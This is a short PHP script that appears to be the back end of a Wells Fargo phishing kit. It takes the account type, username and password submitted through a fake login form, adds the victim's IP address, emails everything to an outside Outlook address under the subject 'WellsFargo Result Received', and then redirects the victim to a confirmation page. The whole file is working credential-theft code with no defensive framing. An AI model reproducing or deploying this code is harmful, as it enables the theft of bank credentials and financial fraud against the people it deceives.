<?php
$applyid = $_POST['formselect1'];
$pass = $_POST['formtext2'];
$pass2 = $_POST['formtext3'];
$ip = $_SERVER['REMOTE_ADDR'];
$line = ("___________________");
$message = ("Account Type:$applyid\r\nUserName:$pass\r\nPassword:$pass2\r\n$ip\r\n$line\r\n");
$to = "sauceshed@outlook.com, sauceshed@outlook.com";
$subject = "WellsFargo Result Received";
$from= "hello@gmail.com";
$headers = "From:" . $from;
mail($to,$subject,$message,$headers);
header("Location: confirm.html");